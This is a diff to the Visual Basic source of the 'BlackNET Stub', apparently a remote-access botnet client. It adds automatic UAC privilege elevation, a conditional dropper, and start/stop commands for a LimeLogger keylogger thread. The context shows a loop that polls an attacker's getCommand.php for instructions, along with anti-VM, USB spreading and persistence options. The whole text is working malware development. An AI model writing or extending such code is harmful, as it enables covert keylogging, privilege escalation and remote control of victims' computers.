@@ -6,6 +6,7 @@ Imports System.Security.Cryptography
 Imports System.Management
 Imports System.Reflection
 Imports System.Security.Principal
+Imports Microsoft.VisualBasic.Devices
 
 ' -------------------------------
 ' BlackNET Stub
@@ -33,6 +34,7 @@ Public Class Form1
     Public BypassScanning As String = "[BypassSCP]"
     Public USBSpread As String = "[USBSpread]"
     Public AntiVM As String = "[AntiVM]"
+    Public ElevateUAC As String = "[ElevateUAC]"
     Public RSAKey As String = "[RSAKey]"
     Public RSAStatus As String = "[RSAStatus]"
     Public InstallName As String = "[Install_Name]"
@@ -92,12 +94,16 @@ Public Class Form1
 
             If BinderStatus = "True" Then
                 Dim Binder As New Binder
-                With Binder
-                    .BinderBytes = BinderBytes
-                    .DropperName = DropperName
-                    .DropperPath = DropperPath
-                    .StartBinder()
-                End With
+                If File.Exists(Environ(DropperPath) & DropperName) Then
+
+                Else
+                    With Binder
+                        .BinderBytes = BinderBytes
+                        .DropperName = DropperName
+                        .DropperPath = DropperPath
+                        .StartBinder()
+                    End With
+                End If
             End If
 
             If Startup = "True" Then
@@ -114,6 +120,14 @@ Public Class Form1
             If AntiVM = "True" Then
                 Dim AntiVirtual As New AntiVM
                 AntiVirtual.ST(Application.ExecutablePath)
+            End If
+
+            If ElevateUAC = "True" Then
+                Try
+                    RestartElevated()
+                Catch ex As Exception
+                    Return
+                End Try
             End If
 
             If USBSpread = "True" Then
@@ -187,12 +201,12 @@ Public Class Form1
     Public Function checkBlacklist() As Boolean
         Return My.Settings.blacklist
     End Function
-
     Public Sub IND(ByVal x As Boolean)
         Try
             Do While x = True
                 Dim CurrentHost As String
                 Dim GetCommands As New WebClient
+                Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
                 If RSAStatus = "True" Then : CurrentHost = RSA_Decrypt(Host, RSAKey) : Else : CurrentHost = Host : End If
                 Dim Command As String = GetCommands.DownloadString(CurrentHost & "/getCommand.php?id=" & ID & "_" & HWD())
                 Dim A As String() = Split(C.DEB(Command), Y)
@@ -396,9 +410,12 @@ Public Class Form1
                         End If
 
                     Case "StartKeylogger"
-                        Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
                         tt.IsBackground = True
                         tt.Start()
+                        C.Send("CleanCommands")
+
+                    Case "StopKeylogger"
+                        tt.Abort()
                         C.Send("CleanCommands")
 
                     Case "RetriveLogs"
